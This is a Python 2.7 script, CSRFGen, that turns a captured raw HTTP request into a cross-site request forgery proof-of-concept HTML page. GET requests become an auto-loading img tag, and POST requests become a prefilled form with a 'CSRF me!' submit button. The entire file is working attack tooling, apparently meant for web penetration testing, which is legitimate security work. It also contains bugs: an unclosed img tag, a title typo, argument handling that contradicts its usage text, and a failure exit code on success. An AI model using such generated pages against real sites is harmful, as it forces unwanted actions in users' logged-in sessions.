#!/usr/bin/python2.7

import sys
import urllib

class CSRFGenerator(object):

    def __init__(self):
        self.__init()

    def __init(self):
        self.__rawRequest  = ""
        self.__method = ""
        self.__url = ""
        self.__host = ""
        self.__port = ""
        self.__contentType = ""
        self.__postParameters = []
        self.__csrfPoC = ""

    def readFromFile(self,file):
        try:
            self.__rawRequest = open(file,"r").read()
            return True
        except:
            return False

    def __analyzeRequest(self):
        
        lines = self.__rawRequest.split("\n")
        for i in range(len(lines)-2):
            line = lines[i]
            try:
                if("HTTP/1" in line):
                    if(self.__rawRequest[:3]=="GET"):
                        self.__method = "GET"
                    elif(self.__rawRequest[:4]=="POST"):
                        self.__method = "POST"
                    else:
                        return False
                    self.__url = self.__URLDecode(line.split(" ")[1].strip())
                if("Host:" in line):
                    self.__host = line[5:].strip()
                if("Content-Type:" in line):
                    self.__contentType = line[13:].strip()
            except:
                return False
        try:
            #Params should be in the last line
            line = lines[len(lines)-1].strip()
            params = line.split("&")
            for param in params:
                try:
                    var, value = param.split("=")
                    self.__postParameters.append([var,self.__URLDecode(value)])
                except:
                    pass
        except:
            return False

        return True

    def __URLDecode(self,url,encoding="utf8"):
        return urllib.unquote(url).decode(encoding)

    def __parseRequest(self):
        if(not self.__analyzeRequest()):
            return False
        else:
            return True

    def generatePoC(self):
        if(not self.__parseRequest()):
            return False

        if(self.__method=="GET"):
            self.__generateGETPoC()
        elif(self.__method=="POST"):
            self.__generatePOSTPoC()
        else:
            return False

        return True

    def __generateGETPoC(self):
        html = \
        """
    <html>
        <head>
            <title>CSRF PoC</title>
        </head>
        <body>
            <img src="http://"""+ self.__host + self.__url +""""
        </body>
    </html>
        """

        self.__csrfPoC = html
        return True

    def __generatePOSTPoC(self):
        html = \
        """
    <html>
        <head>
            <tilte>CSRF Poc</title>
        </head>
        <body>
            <form action="http://"""+ self.__host + self.__url +"""" method="POST" id="hackme" >\n{{REPLACE}}
            </form>
            <button onclick='document.getElementById("hackme").submit()'>CSRF me!</button>
        </body>
    </html>
        """

        params = ""
        for pair in self.__postParameters:
            try:
                params += "\t\t<input type='text' name='"+pair[0]+"' value='"+pair[1]+"' />\n"
            except:
                pass
        self.__csrfPoC = html.replace("{{REPLACE}}",params)
        return True

    def setRequest(self,request):
        self.__rawRequest = request

    def writeToFile(self, file):
        try:
            handle = open(file,"w")
            handle.write(self.__csrfPoC.encode('utf8')+"\n")
            handle.close()
            return True
        except:
            return False

    def getRequest(self):
        return self.__rawRequest

    def getMethod(self):
        return self.__method

    def getURL(self):
        return self.__url

    def getHost(self):
        return self.__host

    def getFullURL(self):
        return self.__host + str(self.__port) + self.__url

    def getPort(self):
        return self.__port

    def getContentType(self):
        return self.__contentType

    def getPostParams(self):
        return self.__postParameters

    def getCSRFPoC(self):
        return self.__csrfPoC

def usage():
    desc = \
    """
[*] Usage: ./""" + sys.argv[0] + """ [Request] [PoC]
[-] Request: File containing the HTTP-Request - Default: csrf.txt
[-] PoC: File to write the CSRF PoC - Default: csrf.html
    """
    print desc

def main():
    print "[*] Started CSRFGen"
    print "[*] Use -h/--help for more information"
    try:
        if ((sys.argv[1]=="-h") or (sys.argv[1]=="--help")):
            usage()
            sys.exit(0)
    except:
        pass

    if len(sys.argv) >= 1:
        csrf_poc_file = sys.argv[1]
    else:
        csrf_poc_file = "csrf.html"

    csrf_file = "csrf.txt"

    print "[*] Generating PoC"
    status = True
    poc = CSRFGenerator()
    status &= poc.readFromFile(csrf_file)
    status &= poc.generatePoC()
    status &= poc.writeToFile(csrf_poc_file)
    if not status:
        print "[*] Something went wrong :("
    else:
        print "[*] Successfully created PoC!"
        print "[*] Showing PoC"
        print poc.getCSRFPoC()
    print "[*] Finished!"

    sys.exit(1)
main()